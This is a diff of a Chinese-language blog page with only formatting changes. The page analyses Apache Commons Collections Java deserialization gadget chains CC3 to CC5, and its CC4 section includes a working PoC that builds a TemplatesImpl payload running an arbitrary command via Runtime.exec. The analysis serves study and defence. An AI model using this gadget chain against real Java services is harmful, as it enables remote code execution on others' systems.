-    <span style="color:#75715e">// create handler2 with lazyMap
-</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Since AnnotationInvocationHandler is an internal class, it cannot be directly instantiated, so it is
-</span><span style="color:#75715e"></span>    <span style="color:#75715e">// necessary to use reflection to construct
-</span><span style="color:#75715e"></span>    Class clazz2 <span style="color:#f92672">=</span> Class<span style="color:#f92672">.</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span style="color:#f92672">);</span>
-    Constructor constructor <span style="color:#f92672">=</span> clazz2<span style="color:#f92672">.</span><span style="color:#a6e22e">getDeclaredConstructor</span><span style="color:#f92672">(</span>Class<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">,</span> Map<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">);</span>
-    constructor<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
-    InvocationHandler handler <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>InvocationHandler<span style="color:#f92672">)</span> constructor<span style="color:#f92672">.</span><span style="color:#a6e22e">newInstance</span><span style="color:#f92672">(</span>Retention<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">,</span> lazyMap<span style="color:#f92672">);</span>
+    <span style=color:#75715e>// create handler2 with lazyMap
+</span><span style=color:#75715e></span>    <span style=color:#75715e>// Since AnnotationInvocationHandler is an internal class, it cannot be directly instantiated, so it is
+</span><span style=color:#75715e></span>    <span style=color:#75715e>// necessary to use reflection to construct
+</span><span style=color:#75715e></span>    Class clazz2 <span style=color:#f92672>=</span> Class<span style=color:#f92672>.</span><span style=color:#a6e22e>forName</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span style=color:#f92672>);</span>
+    Constructor constructor <span style=color:#f92672>=</span> clazz2<span style=color:#f92672>.</span><span style=color:#a6e22e>getDeclaredConstructor</span><span style=color:#f92672>(</span>Class<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> Map<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>);</span>
+    constructor<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
+    InvocationHandler handler <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>InvocationHandler<span style=color:#f92672>)</span> constructor<span style=color:#f92672>.</span><span style=color:#a6e22e>newInstance</span><span style=color:#f92672>(</span>Retention<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> lazyMap<span style=color:#f92672>);</span>
 
-    <span style="color:#75715e">// create proxyMap with handler
-</span><span style="color:#75715e"></span>    Map proxyMap <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>Map<span style="color:#f92672">)</span> Proxy<span style="color:#f92672">.</span><span style="color:#a6e22e">newProxyInstance</span><span style="color:#f92672">(</span>
-            Map<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getClassLoader</span><span style="color:#f92672">(),</span>
-            <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]{</span>Map<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">},</span>
+    <span style=color:#75715e>// create proxyMap with handler
+</span><span style=color:#75715e></span>    Map proxyMap <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>Map<span style=color:#f92672>)</span> Proxy<span style=color:#f92672>.</span><span style=color:#a6e22e>newProxyInstance</span><span style=color:#f92672>(</span>
+            Map<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getClassLoader</span><span style=color:#f92672>(),</span>
+            <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]{</span>Map<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>},</span>
             handler
-    <span style="color:#f92672">);</span>
+    <span style=color:#f92672>);</span>
 
-    <span style="color:#75715e">// create handler with proxyMap
-</span><span style="color:#75715e"></span>    handler <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>InvocationHandler<span style="color:#f92672">)</span> constructor<span style="color:#f92672">.</span><span style="color:#a6e22e">newInstance</span><span style="color:#f92672">(</span>Override<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">,</span> proxyMap<span style="color:#f92672">);</span>
+    <span style=color:#75715e>// create handler with proxyMap
+</span><span style=color:#75715e></span>    handler <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>InvocationHandler<span style=color:#f92672>)</span> constructor<span style=color:#f92672>.</span><span style=color:#a6e22e>newInstance</span><span style=color:#f92672>(</span>Override<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> proxyMap<span style=color:#f92672>);</span>
 
-    <span style="color:#66d9ef">return</span> handler<span style="color:#f92672">;</span>
-<span style="color:#f92672">}</span>
-</code></pre></div><h2 id="commonscollections4">CommonsCollections4</h2>
+    <span style=color:#66d9ef>return</span> handler<span style=color:#f92672>;</span>
+<span style=color:#f92672>}</span>
+</code></pre></div><h2 id=commonscollections4>CommonsCollections4</h2>
 <p>CommonsCollections4可以说没有什么新东西，只是将CC2中的InvokerTransformer换成了CC3中的ChainedTransformer来触发newTransformer。CC2中利用InvokerTransformer在处理比较的对象，设置比较的对象为templates，就可以通过InvokerTransformer调用newTransformer；CC4中则是直接设置为ChainedTransformer，那么任意对象一旦进行比较，就可以触发ChainedTransformer.transform 方法，从而触发templates.newTransformer方法。</p>
 <p>需要注意的是CC4中不能直接设置ChianedTransformer的值为前面的链，因为queue在添加第二个元素的时候就会触发进行比较，从而ChianedTransformer.transform，导致出错或无法序列化，因此需要先设置一个可以正常执行的ChianedTransformer，然后通过反射设置ChianedTransformer：</p>
 <p>PoC：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Object <span style="color:#a6e22e">getObject</span><span style="color:#f92672">(</span>Stringcommand<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
-    <span style="color:#75715e">// TemplatesImpl requires the Class from bytecodes must be a subclass of AbstractTranslet.
-</span><span style="color:#75715e"></span>    Class absTranslet <span style="color:#f92672">=</span> Class<span style="color:#f92672">.</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;org.apache.xalan.xsltc.runtime.AbstractTranslet&#34;</span><span style="color:#f92672">);</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> Object <span style=color:#a6e22e>getObject</span><span style=color:#f92672>(</span>Stringcommand<span style=color:#f92672>)</span> <span style=color:#66d9ef>throws</span> Exception <span style=color:#f92672>{</span>
+    <span style=color:#75715e>// TemplatesImpl requires the Class from bytecodes must be a subclass of AbstractTranslet.
+</span><span style=color:#75715e></span>    Class absTranslet <span style=color:#f92672>=</span> Class<span style=color:#f92672>.</span><span style=color:#a6e22e>forName</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;org.apache.xalan.xsltc.runtime.AbstractTranslet&#34;</span><span style=color:#f92672>);</span>
 
-    <span style="color:#75715e">// Generate the bytecodes using Javassist
-</span><span style="color:#75715e"></span>    ClassPool pool <span style="color:#f92672">=</span> ClassPool<span style="color:#f92672">.</span><span style="color:#a6e22e">getDefault</span><span style="color:#f92672">();</span>
-    pool<span style="color:#f92672">.</span><span style="color:#a6e22e">insertClassPath</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> ClassClassPath<span style="color:#f92672">(</span>absTranslet<span style="color:#f92672">));</span>
-    CtClass clazz <span style="color:#f92672">=</span> pool<span style="color:#f92672">.</span><span style="color:#a6e22e">makeClass</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;CommonsCollections4&#34;</span><span style="color:#f92672">);</span>
-    clazz<span style="color:#f92672">.</span><span style="color:#a6e22e">makeClassInitializer</span><span style="color:#f92672">().</span><span style="color:#a6e22e">insertAfter</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.lang.Runtime.getRuntime().exec(\&#34;&#34;</span> <span style="color:#f92672">+</span>command<span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\&#34;);&#34;</span><span style="color:#f92672">);</span>
-    clazz<span style="color:#f92672">.</span><span style="color:#a6e22e">setSuperclass</span><span style="color:#f92672">(</span>pool<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>absTranslet<span style="color:#f92672">.</span><span style="color:#a6e22e">getName</span><span style="color:#f92672">()));</span>
-    <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> bytecodes <span style="color:#f92672">=</span> clazz<span style="color:#f92672">.</span><span style="color:#a6e22e">toBytecode</span><span style="color:#f92672">();</span>
+    <span style=color:#75715e>// Generate the bytecodes using Javassist
+</span><span style=color:#75715e></span>    ClassPool pool <span style=color:#f92672>=</span> ClassPool<span style=color:#f92672>.</span><span style=color:#a6e22e>getDefault</span><span style=color:#f92672>();</span>
+    pool<span style=color:#f92672>.</span><span style=color:#a6e22e>insertClassPath</span><span style=color:#f92672>(</span><span style=color:#66d9ef>new</span> ClassClassPath<span style=color:#f92672>(</span>absTranslet<span style=color:#f92672>));</span>
+    CtClass clazz <span style=color:#f92672>=</span> pool<span style=color:#f92672>.</span><span style=color:#a6e22e>makeClass</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;CommonsCollections4&#34;</span><span style=color:#f92672>);</span>
+    clazz<span style=color:#f92672>.</span><span style=color:#a6e22e>makeClassInitializer</span><span style=color:#f92672>().</span><span style=color:#a6e22e>insertAfter</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;java.lang.Runtime.getRuntime().exec(\&#34;&#34;</span> <span style=color:#f92672>+</span>command<span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;\&#34;);&#34;</span><span style=color:#f92672>);</span>
+    clazz<span style=color:#f92672>.</span><span style=color:#a6e22e>setSuperclass</span><span style=color:#f92672>(</span>pool<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>absTranslet<span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>()));</span>
+    <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> bytecodes <span style=color:#f92672>=</span> clazz<span style=color:#f92672>.</span><span style=color:#a6e22e>toBytecode</span><span style=color:#f92672>();</span>
 
-    <span style="color:#75715e">// Use reflection setting _Bytecodes and _name
-</span><span style="color:#75715e"></span>    TemplatesImpl templates <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TemplatesImpl<span style="color:#f92672">();</span>
-setFieldValue<span style="color:#f92672">(</span>templates<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;_bytecodes&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]{</span>bytecodes<span style="color:#f92672">});</span>
-setFieldValue<span style="color:#f92672">(</span>templates<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;_name&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;CommonsCollections4&#34;</span><span style="color:#f92672">);</span>
+    <span style=color:#75715e>// Use reflection setting _Bytecodes and _name
+</span><span style=color:#75715e></span>    TemplatesImpl templates <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> TemplatesImpl<span style=color:#f92672>();</span>
+setFieldValue<span style=color:#f92672>(</span>templates<span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;_bytecodes&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[][]{</span>bytecodes<span style=color:#f92672>});</span>
+setFieldValue<span style=color:#f92672>(</span>templates<span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;_name&#34;</span><span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;CommonsCollections4&#34;</span><span style=color:#f92672>);</span>
 
-    <span style="color:#75715e">// Create ConstantTransformer and InstantiateTransformer with no use value.
-</span><span style="color:#75715e"></span>    ConstantTransformer constant <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ConstantTransformer<span style="color:#f92672">(</span>String<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">);</span>
-    Class<span style="color:#f92672">[]</span> paramTypes <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]{</span>String<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">};</span>
-    Object<span style="color:#f92672">[]</span> args <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]{</span><span style="color:#e6db74">&#34;foo&#34;</span><span style="color:#f92672">};</span>
-    InstantiateTransformer instantiate <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InstantiateTransformer<span style="color:#f92672">(</span>paramTypes<span style="color:#f92672">,</span> args<span style="color:#f92672">);</span>
+    <span style=color:#75715e>// Create ConstantTransformer and InstantiateTransformer with no use value.
+</span><span style=color:#75715e></span>    ConstantTransformer constant <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ConstantTransformer<span style=color:#f92672>(</span>String<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>);</span>
+    Class<span style=color:#f92672>[]</span> paramTypes <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]{</span>String<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>};</span>
+    Object<span style=color:#f92672>[]</span> args <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]{</span><span style=color:#e6db74>&#34;foo&#34;</span><span style=color:#f92672>};</span>
+    InstantiateTransformer instantiate <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> InstantiateTransformer<span style=color:#f92672>(</span>paramTypes<span style=color:#f92672>,</span> args<span style=color:#f92672>);</span>
 
-    <span style="color:#75715e">// Construct a ChainedTransformer instantiated a TxAXFilter object
-</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">final</span> Transformer transformerChain <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ChainedTransformer<span style="color:#f92672">(</span>constant<span style="color:#f92672">,</span> instantiate<span style="color:#f92672">);</span>
+    <span style=color:#75715e>// Construct a ChainedTransformer instantiated a TxAXFilter object
+</span><span style=color:#75715e></span>    <span style=color:#66d9ef>final</span> Transformer transformerChain <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ChainedTransformer<span style=color:#f92672>(</span>constant<span style=color:#f92672>,</span> instantiate<span style=color:#f92672>);</span>
 
-    PriorityQueue<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> queue <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> PriorityQueue<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;(</span>2<span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> TransformingComparator<span style="color:#f92672">(</span>transformerChain<span style="color:#f92672">));</span>
-    queue<span style="color:#f92672">.</span><span style="color:#a6e22e">add</span><span style="color:#f92672">(</span>1<span style="color:#f92672">);</span>
-    queue<span style="color:#f92672">.</span><span style="color:#a6e22e">add</span><span style="color:#f92672">(</span>1<span style="color:#f92672">);</span>
+    PriorityQueue<span style=color:#f92672>&lt;</span>Object<span style=color:#f92672>&gt;</span> queue <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> PriorityQueue<span style=color:#f92672>&lt;</span>Object<span style=color:#f92672>&gt;(</span>2<span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> TransformingComparator<span style=color:#f92672>(</span>transformerChain<span style=color:#f92672>));</span>
+    queue<span style=color:#f92672>.</span><span style=color:#a6e22e>add</span><span style=color:#f92672>(</span>1<span style=color:#f92672>);</span>
+    queue<span style=color:#f92672>.</span><span style=color:#a6e22e>add</span><span style=color:#f92672>(</span>1<span style=color:#f92672>);</span>
 
-    <span style="color:#75715e">// Set the true value
-</span><span style="color:#75715e"></span>setFieldValue<span style="color:#f92672">(</span>constant<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;iConstant&#34;</span><span style="color:#f92672">,</span> TrAXFilter<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">);</span>
-    paramTypes <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>Class<span style="color:#f92672">[])</span>getFieldValue<span style="color:#f92672">(</span>instantiate<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;iParamTypes&#34;</span><span style="color:#f92672">);</span>
-    args <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>Object<span style="color:#f92672">[])</span>getFieldValue<span style="color:#f92672">(</span>instantiate<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;iArgs&#34;</span><span style="color:#f92672">);</span>
-    paramTypes<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> Templates<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">;</span>
-    args<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> templates<span style="color:#f92672">;</span>
+    <span style=color:#75715e>// Set the true value
+</span><span style=color:#75715e></span>setFieldValue<span style=color:#f92672>(</span>constant<span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;iConstant&#34;</span><span style=color:#f92672>,</span> TrAXFilter<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>);</span>
+    paramTypes <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>Class<span style=color:#f92672>[])</span>getFieldValue<span style=color:#f92672>(</span>instantiate<span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;iParamTypes&#34;</span><span style=color:#f92672>);</span>
+    args <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>Object<span style=color:#f92672>[])</span>getFieldValue<span style=color:#f92672>(</span>instantiate<span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;iArgs&#34;</span><span style=color:#f92672>);</span>
+    paramTypes<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span> <span style=color:#f92672>=</span> Templates<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>;</span>
+    args<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span> <span style=color:#f92672>=</span> templates<span style=color:#f92672>;</span>
 
-    <span style="color:#66d9ef">return</span> queue<span style="color:#f92672">;</span>
-<span style="color:#f92672">}</span>
-</code></pre></div><h2 id="commonscollections5">CommonsCollections5</h2>
+    <span style=color:#66d9ef>return</span> queue<span style=color:#f92672>;</span>
+<span style=color:#f92672>}</span>
+</code></pre></div><h2 id=commonscollections5>CommonsCollections5</h2>
 <p>CC5换了一种方式来触发LazyMap.get()。在CC1和CC3中，都是通过AnnotationInvocationHandler和代理来触发LazyMap.get()，而CC5则完全不同，其使用的是TiedMapEntry.toString 方法来触发，接下来分析一下：</p>
 <p>TiedMapEntry初始化时可以接受一个Map类型的参数和一个Object参数：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#a6e22e">TiedMapEntry</span><span style="color:#f92672">(</span>Mapmap<span style="color:#f92672">,</span> Objectkey<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-    <span style="color:#66d9ef">super</span><span style="color:#f92672">();</span>
-    <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">map</span><span style="color:#f92672">=</span>map<span style="color:#f92672">;</span>
-    <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">key</span><span style="color:#f92672">=</span>key<span style="color:#f92672">;</span>
-<span style="color:#f92672">}</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>public</span> <span style=color:#a6e22e>TiedMapEntry</span><span style=color:#f92672>(</span>Mapmap<span style=color:#f92672>,</span> Objectkey<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+    <span style=color:#66d9ef>super</span><span style=color:#f92672>();</span>
+    <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>map</span><span style=color:#f92672>=</span>map<span style=color:#f92672>;</span>
+    <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>key</span><span style=color:#f92672>=</span>key<span style=color:#f92672>;</span>
+<span style=color:#f92672>}</span>
 </code></pre></div><p>所以可以将LazyMap作为参数传入进去，而这个函数的toString方法会调用一个getValue方法：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">toString</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
-    <span style="color:#66d9ef">return</span> getKey<span style="color:#f92672">()</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;=&#34;</span> <span style="color:#f92672">+</span> getValue<span style="color:#f92672">();</span>
-<span style="color:#f92672">}</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>toString</span><span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
+    <span style=color:#66d9ef>return</span> getKey<span style=color:#f92672>()</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;=&#34;</span> <span style=color:#f92672>+</span> getValue<span style=color:#f92672>();</span>
+<span style=color:#f92672>}</span>
 </code></pre></div><p>而在getValue这个方法中，就会调用map.get()方法。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">getValue</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
-    <span style="color:#66d9ef">return</span> map<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>key<span style="color:#f92672">);</span>
-<span style="color:#f92672">}</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>public</span> Object <span style=color:#a6e22e>getValue</span><span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
+    <span style=color:#66d9ef>return</span> map<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>key<span style=color:#f92672>);</span>
+<span style=color:#f92672>}</span>
 </code></pre></div><p>同时这个key又是我们作为参数传进去的，所以可以直接达到LazyMap.get(key)并且参数key不是LazyMap键值的目的，也就能顺理成章触发命令执行的语句。</p>
 <p>当然还没完，还要想办法触发这个 toString 方法，这里使用的是BadAttributeValueExpException这个类，因为这个类的readObject方法中，就有调用到 toString 方法：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">readObject</span><span style="color:#f92672">(</span>ObjectInputStream ois<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> IOException<span style="color:#f92672">,</span> ClassNotFoundException <span style="color:#f92672">{</span>
-        ObjectInputStream<span style="color:#f92672">.</span><span style="color:#a6e22e">GetField</span> gf <span style="color:#f92672">=</span> ois<span style="color:#f92672">.</span><span style="color:#a6e22e">readFields</span><span style="color:#f92672">();</span>
-        Object valObj <span style="color:#f92672">=</span> gf<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;val&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">);</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>readObject</span><span style=color:#f92672>(</span>ObjectInputStream ois<span style=color:#f92672>)</span> <span style=color:#66d9ef>throws</span> IOException<span style=color:#f92672>,</span> ClassNotFoundException <span style=color:#f92672>{</span>
+        ObjectInputStream<span style=color:#f92672>.</span><span style=color:#a6e22e>GetField</span> gf <span style=color:#f92672>=</span> ois<span style=color:#f92672>.</span><span style=color:#a6e22e>readFields</span><span style=color:#f92672>();</span>
+        Object valObj <span style=color:#f92672>=</span> gf<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;val&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>);</span>
 
-        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>valObj <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-            val <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
-        <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>valObj <span style="color:#66d9ef">instanceof</span> String<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-            val<span style="color:#f92672">=</span> valObj<span style="color:#f92672">;</span>
-        <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>System<span style="color:#f92672">.</span><span style="color:#a6e22e">getSecurityManager</span><span style="color:#f92672">()</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>
-                <span style="color:#f92672">||</span> valObj <span style="color:#66d9ef">instanceof</span> Long
-                <span style="color:#f92672">||</span> valObj <span style="color:#66d9ef">instanceof</span> Integer
-                <span style="color:#f92672">||</span> valObj <span style="color:#66d9ef">instanceof</span> Float
-                <span style="color:#f92672">||</span> valObj <span style="color:#66d9ef">instanceof</span> Double
-                <span style="color:#f92672">||</span> valObj <span style="color:#66d9ef">instanceof</span> Byte
-                <span style="color:#f92672">||</span> valObj <span style="color:#66d9ef">instanceof</span> Short
-                <span style="color:#f92672">||</span> valObj <span style="color:#66d9ef">instanceof</span> Boolean<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-            val <span style="color:#f92672">=</span> valObj<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">();</span>
-        <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span> <span style="color:#75715e">// the serialized object is from a version without JDK-8019292 fix
-</span><span style="color:#75715e"></span>            val <span style="color:#f92672">=</span> System<span style="color:#f92672">.</span><span style="color:#a6e22e">identityHashCode</span><span style="color:#f92672">(</span>valObj<span style="color:#f92672">)</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;@&#34;</span> <span style="color:#f92672">+</span> valObj<span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">getName</span><span style="color:#f92672">();</span>
-        <span style="color:#f92672">}</span>
-    <span style="color:#f92672">}</span>
+        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>valObj <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+            val <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
+        <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>valObj <span style=color:#66d9ef>instanceof</span> String<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+            val<span style=color:#f92672>=</span> valObj<span style=color:#f92672>;</span>
+        <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>System<span style=color:#f92672>.</span><span style=color:#a6e22e>getSecurityManager</span><span style=color:#f92672>()</span> <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>
+                <span style=color:#f92672>||</span> valObj <span style=color:#66d9ef>instanceof</span> Long
+                <span style=color:#f92672>||</span> valObj <span style=color:#66d9ef>instanceof</span> Integer
+                <span style=color:#f92672>||</span> valObj <span style=color:#66d9ef>instanceof</span> Float
+                <span style=color:#f92672>||</span> valObj <span style=color:#66d9ef>instanceof</span> Double
+                <span style=color:#f92672>||</span> valObj <span style=color:#66d9ef>instanceof</span> Byte
+                <span style=color:#f92672>||</span> valObj <span style=color:#66d9ef>instanceof</span> Short
